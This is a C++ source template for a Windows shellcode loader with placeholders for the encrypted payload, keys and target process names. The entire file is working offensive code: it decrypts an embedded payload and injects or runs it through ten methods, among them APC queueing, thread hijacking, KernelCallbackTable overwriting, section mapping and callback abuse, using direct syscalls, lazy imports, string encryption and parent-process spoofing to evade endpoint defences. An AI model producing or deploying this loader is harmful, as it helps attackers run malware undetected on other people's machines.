#include "structs/typedef.h"
#include "libs/skCrypter.h"
#include "libs/lazy_importer.hpp"
#include "libs/in_memory_init.hpp"
#include "libs/aes.hpp"

#pragma comment(linker, "/ENTRY:main")

int method = ${method};

unsigned char shellcode[] = { ${shellcode} };

void AESDecrypt()
{
	unsigned char key[] = { ${aes_key} };
	unsigned char iv[] = { ${aes_iv} };

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));
}

void MovePayload(HANDLE hProcess, LPVOID shellcodeAddr)
{
    AESDecrypt();
	unsigned char key[] = { ${xor_key} };
	for (int i = 0; i < sizeof(shellcode); i++) {
		unsigned char payload = shellcode[i] ^= key[i % sizeof(key)];
		INLINE_SYSCALL(NtWriteVirtualMemory)(hProcess, LPVOID((ULONG_PTR)shellcodeAddr + i), &payload, sizeof(payload), NULL);
		shellcode[i] = NULL;
	}

	LI_FN(wprintf)(L"%4s[*] Payload decrypted and written\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", sizeof(shellcode));
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
}

VOID Delay()
{
	UINT dwMilliseconds = 1000;
	LARGE_INTEGER delay;
	delay.QuadPart = -(dwMilliseconds * 10000LL);
	INLINE_SYSCALL(NtDelayExecution)(FALSE, &delay);
}

DWORD GetPID(LPCWSTR processName)
{
	LPVOID bufferAddr = NULL;
	SIZE_T bufferSize = 1024 * 1024;
	ULONG retLength;

	INLINE_SYSCALL(NtAllocateVirtualMemory)((HANDLE)-1, &bufferAddr, 0, &bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)bufferAddr;
	INLINE_SYSCALL(NtQuerySystemInformation)(SystemProcessInformation, (PVOID)spi, bufferSize, &retLength);

	while (spi->NextEntryOffset) {
		spi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)spi + spi->NextEntryOffset);
		if (!LI_FN(StrCmpW)(spi->ImageName.Buffer, processName)) {
			HANDLE hProcess = NULL;
			OBJECT_ATTRIBUTES objectAttr;
			InitializeObjectAttributes(&objectAttr, NULL, NULL, NULL, NULL);
			CLIENT_ID clientId = { spi->UniqueProcessId, NULL };

			INLINE_SYSCALL(NtOpenProcess)(&hProcess, PROCESS_QUERY_INFORMATION, &objectAttr, &clientId);
			if (hProcess) {
				break;
			}
		}
	}

	return (DWORD)spi->UniqueProcessId;
}

PROCESS_INFORMATION SpawnProcess(LPCWSTR parentProcess, LPCWSTR spawnProcess, LPCWSTR currentDir)
{
	SIZE_T attrSize;
	STARTUPINFOEX si = { sizeof(si) };
	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = SW_HIDE;

	InitializeProcThreadAttributeList(NULL, 2, 0, &attrSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)LI_FN(RtlAllocateHeap)(LI_FN(GetProcessHeap)(), 0, attrSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attrSize);

	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, NULL, NULL, NULL);

	DWORD parentPID = GetPID(parentProcess);
	CLIENT_ID clientId = { (HANDLE)parentPID, NULL };

	HANDLE hParent;
	INLINE_SYSCALL(NtOpenProcess)(&hParent, PROCESS_CREATE_PROCESS, &objAttr, &clientId);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL);
	LI_FN(wprintf)(L"%4s[*] Spoofed parent process: %ws (PID: %lu)\n", "", parentProcess, parentPID);

	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

	DWORD processCreateFlag = NULL;
	if (method == 3) {
		processCreateFlag = CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT;
	}
	else {
		processCreateFlag = CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;
	}

	PROCESS_INFORMATION pi;
	LI_FN(CreateProcessW)(spawnProcess, (LPWSTR)spawnProcess, nullptr, nullptr, TRUE, processCreateFlag, nullptr, currentDir, (STARTUPINFO*)&si, &pi);
	LI_FN(wprintf)(L"%4s[*] Spawned process: \t%ws (PID: %lu)\n", "", spawnProcess, pi.dwProcessId);

	Delay();

	return pi;
}

void QueueUserAPC(PROCESS_INFORMATION pi)
{
	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)(pi.hProcess, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload(pi.hProcess, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)(pi.hProcess, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	INLINE_SYSCALL(NtQueueApcThread)(pi.hThread, (PKNORMAL_ROUTINE)shellcodeAddr, shellcodeAddr, NULL, NULL);
	LI_FN(wprintf)(L"%4s[*] APC queued\n", "");
	LI_FN(wprintf)(L"%8s[-] Thread ID: \t\t%lu\n", "", pi.dwThreadId);

	INLINE_SYSCALL(NtResumeThread)(pi.hThread, NULL);
	LI_FN(wprintf)(L"%4s[*] Thread resumed\n", "");
	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");

	LI_FN(wprintf)(L"\n[+] Closing opened handles\n");
	INLINE_SYSCALL(NtClose)(pi.hProcess);
	INLINE_SYSCALL(NtClose)(pi.hThread);
	LI_FN(wprintf)(L"%4s[*] Process Handle: \t0x%p\n", "", pi.hProcess);
	LI_FN(wprintf)(L"%4s[*] Thread Handle: \t\t0x%p\n", "", pi.hThread);
}

void ThreadHijacking(PROCESS_INFORMATION pi)
{
	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)(pi.hProcess, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload(pi.hProcess, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)(pi.hProcess, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_CONTROL;
	INLINE_SYSCALL(NtGetContextThread)(pi.hThread, &ctx);
	ctx.Rip = (DWORD_PTR)shellcodeAddr;
	INLINE_SYSCALL(NtSetContextThread)(pi.hThread, &ctx);
	LI_FN(wprintf)(L"%4s[*] Thread context changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Thread ID: \t\t%lu\n", "", pi.dwThreadId);
	LI_FN(wprintf)(L"%8s[-] RIP: \t\t0x%p\n", "", shellcodeAddr);

	INLINE_SYSCALL(NtResumeThread)(pi.hThread, NULL);
	LI_FN(wprintf)(L"%4s[*] Thread resumed\n", "");
	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");

	LI_FN(wprintf)(L"\n[+] Closing opened handles\n");
	INLINE_SYSCALL(NtClose)(pi.hProcess);
	INLINE_SYSCALL(NtClose)(pi.hThread);
	LI_FN(wprintf)(L"%4s[*] Process Handle: \t0x%p\n", "", pi.hProcess);
	LI_FN(wprintf)(L"%4s[*] Thread Handle: \t\t0x%p\n", "", pi.hThread);
}

void KernelCallbackTable(PROCESS_INFORMATION pi)
{
	PROCESS_BASIC_INFORMATION pbi;
	INLINE_SYSCALL(NtQueryInformationProcess)(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	PEB peb;
	INLINE_SYSCALL(NtReadVirtualMemory)(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
	LI_FN(wprintf)(L"%4s[*] Location of addresses\n", "");
	LI_FN(wprintf)(L"%8s[-] PEB: \t\t0x%p\n", "", pbi.PebBaseAddress);

	KERNELCALLBACKTABLE kct;
	INLINE_SYSCALL(NtReadVirtualMemory)(pi.hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
	LI_FN(wprintf)(L"%8s[-] KCT: \t\t0x%p\n", "", peb.KernelCallbackTable);

	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)(pi.hProcess, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload(pi.hProcess, shellcodeAddr);

	LPVOID kctAddress = NULL;
	SIZE_T kctSize = sizeof(kct);
	INLINE_SYSCALL(NtAllocateVirtualMemory)(pi.hProcess, &kctAddress, 0, &kctSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	kct.__fnCOPYDATA = (ULONG_PTR)shellcodeAddr;
	INLINE_SYSCALL(NtWriteVirtualMemory)(pi.hProcess, kctAddress, &kct, sizeof(kct), NULL);
	INLINE_SYSCALL(NtWriteVirtualMemory)(pi.hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &kctAddress, sizeof(ULONG_PTR), NULL);
	LI_FN(wprintf)(L"%4s[*] Target process PEB updated\n", "");
	LI_FN(wprintf)(L"%8s[-] __fnCOPYDATA: \t0x%016IX\n", "", kct.__fnCOPYDATA);

	LI_FN(LoadLibraryW)(skCrypt(L"user32.dll"));
	LI_FN(wprintf)(L"%4s[*] User32.dll loaded\n", "");

	UNICODE_STRING className = { };
	UNICODE_STRING windowName = { };
	HWND hWindow = NULL;
	DWORD pid = 0;
	do {
		hWindow = LI_FN(NtUserFindWindowEx)(nullptr, hWindow, &className, &windowName, 0);

		pid = LI_FN(NtUserQueryWindow)(hWindow, QUERY_WINDOW_UNIQUE_PROCESS_ID);
		if (pid == pi.dwProcessId) {
			break;
		}
	} while (hWindow != NULL);

	LI_FN(wprintf)(L"%4s[*] Target window found\n", "");
	LI_FN(wprintf)(L"%8s[-] PID: \t\t%lu\n", "", pi.dwProcessId);
	LI_FN(wprintf)(L"%8s[-] Handle: \t\t0x%p\n", "", hWindow);

	COPYDATASTRUCT cds;
	LI_FN(NtUserMessageCall)(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds, NULL, FNID_SENDMESSAGE, FALSE);
	LI_FN(wprintf)(L"%4s[*] Message sent\n", "");
	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");

	LI_FN(wprintf)(L"\n[+] Closing opened handles\n");
	INLINE_SYSCALL(NtClose)(pi.hProcess);
	INLINE_SYSCALL(NtClose)(hWindow);
	LI_FN(wprintf)(L"%4s[*] Process Handle: \t0x%p\n", "", pi.hProcess);
	LI_FN(wprintf)(L"%4s[*] Window Handle: \t\t0x%p\n", "", hWindow);
}

void SectionViewMapping(LPCWSTR targetProcess)
{
	HANDLE hSection = NULL;
	LPVOID localSectionAddr = NULL;
	LPVOID remoteSectionAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);

	INLINE_SYSCALL(NtCreateSection)(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&shellcodeSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	LI_FN(wprintf)(L"%4s[*] Memory section created\n", "");
	LI_FN(wprintf)(L"%8s[-] Handle: \t\t0x%p\n", "", hSection);

	INLINE_SYSCALL(NtMapViewOfSectionEx)(hSection, (HANDLE)-1, &localSectionAddr, NULL, &shellcodeSize, NULL, PAGE_READWRITE, NULL, NULL);
	LI_FN(wprintf)(L"%4s[*] Local section view created\n", "");
	LI_FN(wprintf)(L"%8s[-] Local address: \t0x%p\n", "", localSectionAddr);

	DWORD PID = GetPID(targetProcess);
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES objectAttr;
	InitializeObjectAttributes(&objectAttr, NULL, NULL, NULL, NULL);
	CLIENT_ID clientId = { (HANDLE)PID, NULL };
	INLINE_SYSCALL(NtOpenProcess)(&hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, &objectAttr, &clientId);

	INLINE_SYSCALL(NtMapViewOfSectionEx)(hSection, hProcess, &remoteSectionAddr, NULL, &shellcodeSize, NULL, PAGE_EXECUTE_READ, NULL, NULL);
	LI_FN(wprintf)(L"%4s[*] Remote section view created\n", "");
	LI_FN(wprintf)(L"%8s[-] Process: \t\t%ws\n", "", targetProcess);
	LI_FN(wprintf)(L"%8s[-] PID: \t\t%lu\n", "", PID);
	LI_FN(wprintf)(L"%8s[-] Handle: \t\t0x%p\n", "", hProcess);
	LI_FN(wprintf)(L"%8s[-] Remote address: \t0x%p\n", "", remoteSectionAddr);

	MovePayload((HANDLE)-1, localSectionAddr);

	INLINE_SYSCALL(NtUnmapViewOfSection)((HANDLE)-1, localSectionAddr);
	LI_FN(wprintf)(L"%4s[*] Local section view unmapped\n", "");

	HANDLE hThread = NULL;
	INLINE_SYSCALL(NtCreateThreadEx)(&hThread, GENERIC_EXECUTE, NULL, hProcess, remoteSectionAddr, NULL, FALSE, 0, 0, 0, NULL);
	DWORD TID = LI_FN(GetThreadId)(hThread);
	LI_FN(wprintf)(L"%4s[*] Thread created\n", "");
	LI_FN(wprintf)(L"%8s[-] TID: \t\t%lu\n", "", TID);
	LI_FN(wprintf)(L"%8s[-] Handle: \t\t0x%p\n", "", hThread);
	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");

	LI_FN(wprintf)(L"\n[+] Closing opened handles\n");
	INLINE_SYSCALL(NtClose)(hSection);
	INLINE_SYSCALL(NtClose)(hProcess);
	INLINE_SYSCALL(NtClose)(hThread);
	LI_FN(wprintf)(L"%4s[*] Section Handle: \t0x%p\n", "", hSection);
	LI_FN(wprintf)(L"%4s[*] Process Handle: \t0x%p\n", "", hProcess);
	LI_FN(wprintf)(L"%4s[*] Thread Handle: \t\t0x%p\n", "", hThread);
}

void ThreadSuspension(LPCWSTR targetProcess)
{
	DWORD PID = GetPID(targetProcess);
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES objectAttr;
	InitializeObjectAttributes(&objectAttr, NULL, NULL, NULL, NULL);
	CLIENT_ID clientId = { (HANDLE)PID, NULL };
	INLINE_SYSCALL(NtOpenProcess)(&hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &objectAttr, &clientId);
	LI_FN(wprintf)(L"%4s[*] Target process\n", "");
	LI_FN(wprintf)(L"%8s[-] Name: \t\t%ws\n", "", targetProcess);
	LI_FN(wprintf)(L"%8s[-] PID: \t\t%lu\n", "", PID);
	LI_FN(wprintf)(L"%8s[-] Handle: \t\t0x%p\n", "", hProcess);

	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)(hProcess, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload(hProcess, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)(hProcess, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	HANDLE hThread = NULL;
	INLINE_SYSCALL(NtCreateThreadEx)(&hThread, GENERIC_EXECUTE, NULL, hProcess, shellcodeAddr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, NULL);
	DWORD TID = LI_FN(GetThreadId)(hThread);
	LI_FN(wprintf)(L"%4s[*] Thread created\n", "");
	LI_FN(wprintf)(L"%8s[-] TID: \t\t%lu\n", "", TID);
	LI_FN(wprintf)(L"%8s[-] Handle: \t\t0x%p\n", "", hThread);

	INLINE_SYSCALL(NtResumeThread)(hThread, NULL);
	LI_FN(wprintf)(L"%4s[*] Thread resumed\n", "");
	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");

	LI_FN(wprintf)(L"\n[+] Closing opened handles\n");
	INLINE_SYSCALL(NtClose)(hProcess);
	INLINE_SYSCALL(NtClose)(hThread);
	LI_FN(wprintf)(L"%4s[*] Process Handle: \t0x%p\n", "", hProcess);
	LI_FN(wprintf)(L"%4s[*] Thread Handle: \t\t0x%p\n", "", hThread);
}

void LineDDACallback()
{
	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)((HANDLE)-1, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload((HANDLE)-1, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)((HANDLE)-1, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	LI_FN(LoadLibraryW)(skCrypt(L"gdi32.dll"));
	LI_FN(wprintf)(L"%4s[*] Gdi32.dll loaded\n", "");

	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");
	LI_FN(LineDDA)(1, 1, 2, 2, (LINEDDAPROC)shellcodeAddr, NULL);
}

void EnumSystemGeoIDCallback()
{
	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)((HANDLE)-1, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload((HANDLE)-1, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)((HANDLE)-1, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");
	LI_FN(EnumSystemGeoID)(GEOCLASS_NATION, 0, (GEO_ENUMPROC)shellcodeAddr);
}

void FLSCallback()
{
	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)((HANDLE)-1, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload((HANDLE)-1, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)((HANDLE)-1, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	ULONG index = NULL;
	LI_FN(RtlFlsAlloc)((PFLS_CALLBACK_FUNCTION)shellcodeAddr, &index);
	LI_FN(wprintf)(L"%4s[*] FLS index allocated\n", "");

	LI_FN(RtlFlsSetValue)(index, &shellcodeAddr);
	LI_FN(wprintf)(L"%4s[*] Shellcode stored in FLS slot\n", "");

	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");
	LI_FN(RtlFlsFree)(index);
}

void SetTimerEvent()
{
	LPVOID shellcodeAddr = NULL;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtAllocateVirtualMemory)((HANDLE)-1, &shellcodeAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	LI_FN(wprintf)(L"%4s[*] Memory allocated\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", shellcodeSize);
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", shellcodeAddr);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	MovePayload((HANDLE)-1, shellcodeAddr);

	ULONG oldProtection;
	INLINE_SYSCALL(NtProtectVirtualMemory)((HANDLE)-1, &shellcodeAddr, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	LI_FN(LoadLibraryW)(skCrypt(L"user32.dll"));
	LI_FN(wprintf)(L"%4s[*] User32.dll loaded\n", "");

	LI_FN(NtUserSetTimer)(nullptr, 0, 0, (TIMERPROC)shellcodeAddr);
	LI_FN(wprintf)(L"%4s[*] Timer created\n", "");

	MSG msg;
	LI_FN(NtUserGetMessage)(&msg, nullptr, 0, 0);
	LI_FN(wprintf)(L"%4s[*] Message retrieved\n", "");

	LI_FN(wprintf)(L"%4s[*] Message dispatched\n", "");
	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");
	LI_FN(NtUserDispatchMessage)(&msg);
}

void Clipboard()
{
	LI_FN(LoadLibraryW)(skCrypt(L"user32.dll"));
	LI_FN(wprintf)(L"%4s[*] User32.dll loaded\n", "");

	BOOL fEmptyClient;
	LI_FN(NtUserOpenClipboard)(nullptr, &fEmptyClient);
	LI_FN(wprintf)(L"%4s[*] Clipboard opened\n", "");

	AESDecrypt();
	unsigned char key[] = { ${xor_key} };
	for (int i = 0; i < sizeof(shellcode); i++) {
		unsigned char payload = shellcode[i] ^= key[i % sizeof(key)];
	}
    LI_FN(wprintf)(L"%4s[*] Payload decrypted\n", "");

	set_clipboard_params params;
	params.data = LI_FN(GlobalLock)(shellcode);
	LI_FN(NtUserSetClipboardData)(CF_BITMAP, shellcode, &params);
	LI_FN(GlobalUnlock)(shellcode);
	LI_FN(wprintf)(L"%4s[*] Payload injected into clipboard\n", "");
	LI_FN(wprintf)(L"%8s[-] Size: \t\t%zu bytes\n", "", sizeof(shellcode));
	LI_FN(wprintf)(L"%8s[-] Address: \t\t0x%p\n", "", params.data);
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_READWRITE\n", "");

	ULONG oldProtection;
	SIZE_T shellcodeSize = sizeof(shellcode);
	INLINE_SYSCALL(NtProtectVirtualMemory)((HANDLE)-1, &params.data, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtection);
	LI_FN(wprintf)(L"%4s[*] Clipboard memory protection changed\n", "");
	LI_FN(wprintf)(L"%8s[-] Protection: \tPAGE_EXECUTE_READ\n", "");

	LI_FN(NtUserCloseClipboard)();
	LI_FN(wprintf)(L"%4s[*] Clipboard closed\n", "");

	LI_FN(wprintf)(L"%4s[*] Payload executed\n", "");
	void (*pfunc)() = (void (*)())((UINT64)params.data + 0x10);
	pfunc();
}

int main()
{
	jm::init_syscalls_list();

    PROCESS_INFORMATION pi;
	LPCWSTR targetProcess = skCrypt(L"${target_process}");
	LPCWSTR parentProcess = skCrypt(L"${parent_process}");
	LPCWSTR spawnProcess = skCrypt(L"${spawn_process}");
    LPCWSTR currentDir = skCrypt(L"${current_dir}");

	switch (method) {
	case 1:
		LI_FN(wprintf)(L"[+] Launching a sacrificial process\n");
		pi = SpawnProcess(parentProcess, spawnProcess, currentDir);

		LI_FN(wprintf)(L"\n[+] Injecting shellcode via Early Bird APC Queue\n");
		QueueUserAPC(pi);
		break;
	case 2:
		LI_FN(wprintf)(L"[+] Launching a sacrificial process\n");
		pi = SpawnProcess(parentProcess, spawnProcess, currentDir);

		LI_FN(wprintf)(L"\n[+] Injecting shellcode via Thread Hijacking\n");
		ThreadHijacking(pi);
		break;
	case 3:
		LI_FN(wprintf)(L"[+] Launching a sacrificial process\n");
		pi = SpawnProcess(parentProcess, spawnProcess, currentDir);

		LI_FN(wprintf)(L"\n[+] Injecting shellcode via KernelCallbackTable\n");
		KernelCallbackTable(pi);
		break;
	case 4:
		LI_FN(wprintf)(L"[+] Injecting shellcode via Section View Mapping\n");
		SectionViewMapping(targetProcess);
		break;
	case 5:
		LI_FN(wprintf)(L"[+] Injecting shellcode via Thread Suspension\n");
		ThreadSuspension(targetProcess);
		break;
	case 6:
		LI_FN(wprintf)(L"[+] Executing shellcode via LineDDA Callback\n");
		LineDDACallback();
		break;
	case 7:
		LI_FN(wprintf)(L"[+] Executing shellcode via EnumSystemGeoID Callback\n");
		EnumSystemGeoIDCallback();
		break;
	case 8:
		LI_FN(wprintf)(L"[+] Executing shellcode via FLS Callback\n");
		FLSCallback();
		break;
	case 9:
		LI_FN(wprintf)(L"[+] Executing shellcode via SetTimer\n");
		SetTimerEvent();
		break;
	case 10:
		LI_FN(wprintf)(L"[+] Executing shellcode via Clipboard\n");
		Clipboard();
		break;
	}
}
